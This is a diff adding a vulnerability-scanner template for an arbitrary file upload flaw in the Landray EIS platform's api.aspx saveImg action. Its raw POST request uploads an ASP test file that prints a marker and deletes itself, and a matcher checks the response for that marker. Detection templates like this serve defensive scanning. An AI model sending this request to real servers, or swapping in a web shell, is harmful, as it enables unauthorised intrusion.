@@ -1,0 +1,37 @@
+id: landray-eis-file-upload
+
+info:
+  name: "蓝凌EIS智慧协同平台 api.aspx 接口任意文件上传"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该系统组件在处理文件上传请求时未正确验证上传文件类型和路径，
+      攻击者可通过构造恶意请求向服务器上传任意文件。
+  tags: 蓝凌EIS智慧协同平台
+
+http:
+- raw:
+  - |
+    POST /eis/service/api.aspx?action=saveImg HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Connection: close
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Upgrade-Insecure-Requests: 1
+    Content-Type: multipart/form-data; boundary=----test
+
+    ------test
+    Content-Disposition: form-data; name="file"filename="NTest.asp"
+    Content-Type: text/html
+
+    <% Response.Write("NdayTest"); set myfso=server.CreateObject("scripting.filesystemobject"); myfso.DeleteFile(Server.MapPath("NTest.asp")); %>
+    ------test--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
